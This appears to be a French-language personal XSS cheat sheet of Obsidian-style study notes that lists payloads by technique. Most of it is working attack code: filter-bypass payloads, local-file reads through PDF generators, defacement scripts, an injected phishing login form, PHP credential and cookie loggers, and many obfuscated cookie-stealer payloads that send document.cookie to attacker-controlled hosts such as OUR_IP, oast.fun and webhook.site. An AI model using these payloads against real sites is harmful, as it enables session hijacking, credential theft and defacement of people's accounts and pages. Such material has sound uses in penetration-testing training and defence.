
| Types           | Description                                                                                                                                                                                       |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Reflected XSS` | Se produit lorsque l'entrée de l'utilisateur est affichée sur la page après le traitement (par exemple, résultat de recherche ou message d'erreur).                                               |
| `Stored XSS`    | Se produit lorsque les entrées de l'utilisateur sont stockées dans la base de données principale, puis affichées lors de la récupération (par exemple, des publications ou des commentaires).     |
| `DOM XSS`       | Se produit lorsque l'entrée de l'utilisateur est directement affichée dans le navigateur et est écrite dans un objet HTML DOM (par exemple, un nom d'utilisateur vulnérable ou un titre de page). |
| `BLIND XSS`     | Se produit lorsque la vulnérabilité se déclenche sur une page à laquelle nous n'avons pas accès.                                                                                                  |

>[!TIP]
>Toujours étudier le code source de la page afin de voir comment gérer les balises et le comportement du code après injection

> [!TIP]
> Si HttpOnly n'est pas activé -> Vol de cookie possible


- [[#LISTE DES TAGS ET EVENTS]]
- [[#*Test basique*]]
- [[#Bypass alert()]]
- [[#Bypass document.domain]]
- [[#Bypass quotes]]
- [[#Bypass .]]
- [[#XSS dans requête XML / LFI]]
- [[#XSS Server side / LFI avec iframe]]
- [[#Vérifier que le script est exécuté sur le domaine actuel et non pas en sandbox (empêche les attaques XSS)]]

- [[#**Auto Discovery**]]

- [[#**DEFACING**]]
- [[#**PHISHING**]]
- [[#**SESSION HIJACKING**]]



### LISTE DES TAGS ET EVENTS

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
### *Test basique*

```html
<script>alert(1)</script>
```

```html
<script>alert('XSS')</script>
```

```javascript
"#><img src=/ onerror=alert(1)>
```

```javascript
"#><img src=/ onload=alert(1)>
```

```javascript
"#><img src=/ onmouseover=alert(1)>
```

```javascript
<img src=/ onerror=alert(1)>
```

```js
<a onload document.location='http://OUR_IP/index.php?c='+document.cookie;>
```

```js
<script>document.write('TESTING THIS')</script>
```

### *Test BlindXSS*

```html
<script src="http://OUR_IP/script.js"></script>
```

```html
'><script src="http://OUR_IP/script.js"></script>
```

```html
"><script src="http://OUR_IP/script.js"></script>
```

### Bypass alert()

```html
<a href onmouseover=[8].find(alert)>ptdr</a>
```

### Bypass document.domain

```javascript
<a href onmouseover=[document[String.fromCharCode(100,111,109,97,105,110)]].find(alert)>xdxd</a>
```

### Bypass quotes

Format DECIMAL
https://www.ascii-code.com/fr
https://gchq.github.io/CyberChef/#recipe=To_Decimal('Comma',false)&oeol=CRLF

```js
String.fromCharCode(88,83,83)
```

### Bypass .

```javascript
document['domain']
```

### XSS dans requête XML / LFI (Tester sur Generateur de PDF)

```JAVASCRIPT
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(‘GET’,’file:///etc/passwd’);x.send();</script>
```

```js
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

### XSS Server side / LFI avec iframe (Tester sur Generateur de PDF)

```javascript
<iframe src=file:///flag.txt></iframe>
```


### Vérifier que le script est exécuté sur le domaine actuel et non pas en sandbox (empêche les attaques XSS)

```javascript
"><img src=x onerror=prompt(document.domain)>
```

## **Liste complète de payloads ++** 


https://github.com/payloadbox/xss-payload-list
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md



---
# **Auto Discovery**

## *XSStrike*

https://github.com/s0md3v/XSStrike
#### Install

```bash
git clone https://github.com/s0md3v/XSStrike.git;
cd XSStrike;
python3 -m venv .venv;
source .venv/bin/activate;
pip install -r requirements.txt;
python3 xsstrike.py
```

#### Run

```bash
python3 xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```


---
# **DEFACING**


Modifier le site afin d'envoyer un message

## *Changer le background*

#### Changer la couleur

```html
<script>document.body.style.background = "black"</script>
```

#### Changer l'image

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

## *Changer le titre de la page*

```html
<script>document.title = 'HackTheBox Academy'
```

## *Changer le texte de la page*

Un seul élément

```html
<script>document.getElementById("todo").innerHTML = "New Text"</script>
```

```html
<script>$("#todo").html('New Text');</script>
```

Changer tout le body

```html
<script>document.getElementsByTagName('body')[0].innerHTML = "New Text"</script>
```


---
# **PHISHING**


## **Création d'un login Form**

```html
<script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
```

Suppression d'éléments génants

```html
<script>document.getElementById('urlform').remove();</script>
```

Lancer serveur php avec pour index :

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: <redirect_url>");
    fclose($file);
    exit();
}
?>
```

```bash
mkdir /tmp/tmpserver;
cd /tmp/tmpserver;
vi index.php; #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```


---
# **SESSION HIJACKING**

https://app.interactsh.com/#/
http://webhookinbox.com/
https://pipedream.com/requestbin


> [!IMPORTANT]
> En cas de site HTTPS, utiliser interactsh ou requestbin et le payload suivant afin d'éviter les problèmes de formattage de données:

## Payloads cookie stealer

```javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

Méthode fetch qui ne redirige pas !

```javascript
"><script>fetch(`http://dkmrhyztkapvhuhqhkpmi9lqzrg5yxoft.oast.fun?cookie=`+document.cookie)</script>
```

.concat() pour remplacer +

```javascript
"><script>fetch(`http://dkmrhyztkapvhuhqhkpmi9lqzrg5yxoft.oast.fun?cookie=`.concat(document.cookie))</script>
```

animation video

```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="document.location = 'http://OUR_IP:8000/log.php?c=' + document.cookie;"></video>
```

### Bypass de caractères spéciaux blacklistés

#### Base64 avec commentaires pour échapper certains caractères

```js
 <button onfocus=eval/**/(atob(/**/"payload_encodé_en_base64")) autofocus>
```

#### Array sans aucun espace et signe = et + URL encoded

```js
<button/autofocus/onfocus%3do%3d{a:window,b:'lo',c:'cation',e:document,d:'http://webhook.site/b8ab9558-cc83-4e1e-86e2-1f3ba47cc26f?'};o.a[o.b%2bo.c]%3do.d%2bo.e.cookie>
```
#### StringFromCharcode

Document.location onfocus autofocus (pas d'interaction utilisateur)

```js
<xss onfocus=document[String.fromCharCode(108,111,99,97,116,105,111,110)]=[String.fromCharCode(104,116,116,112,58,47,47,115,117,100,109,109,121,117,121,117,102,106,112,112,108,108,107,111,111,109,108,98,108,114,118,97,111,106,104,103,116,105,112,98,46,111,97,115,116,46,102,117,110,63,99,111,111,107,105,101,61)].concat(document[String.fromCharCode(99,111,111,107,105,101)]) autofocus tabindex=1>
```

Document.location onmouseover

```js
<a onmouseover=document[String.fromCharCode(108,111,99,97,116,105,111,110)]=[String.fromCharCode(104,116,116,112,58,47,47,115,117,100,109,109,121,117,121,117,102,106,112,112,108,108,107,111,111,109,108,98,108,114,118,97,111,106,104,103,116,105,112,98,46,111,97,115,116,46,102,117,110,63,99,111,111,107,105,101,61)].concat(document[String.fromCharCode(99,111,111,107,105,101)])>xdxd</a>
```

#### JSFUCKS

https://jsfuck.com/

#### Récupérer propriété du document avec textContent

```js
<button onfocus=location=textContent+cookie autofocus> http://xxx?cookie= </button>
```

## Cookie Stealer 1

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://target.com/");
exit;
?>
```

```bash
sudo php -S 0.0.0.0:8000
```

## Cookie Stealer 2 #BlindXSS

### *Créer un cookiestealer et lancer listener php*

```bash
mkdir /tmp/tmpserver;
cd /tmp/tmpserver;
touch index.php;
echo "
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
" > index.php;
sudo php -S 0.0.0.0:80
```

### *Charger un script à distance*

Changer le nom du script avec le nom du champs à tester

```html
<script src="http://OUR_IP/script.js"></script>
```

```html
'><script src="http://OUR_IP/script.js"></script>
```

```html
"><script src="http://OUR_IP/script.js"></script>
```

```html
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP/script.js\';document.body.appendChild(a)')
```

```html
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP/script.js");a.send();</script>
```

```html
<script>$.getScript("http://OUR_IP/script.js")</script>
```

### *Créer un fichier javascript script.js afin de récupérer le cookie*

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
```





<iframe src=file:///flag.txt></iframe>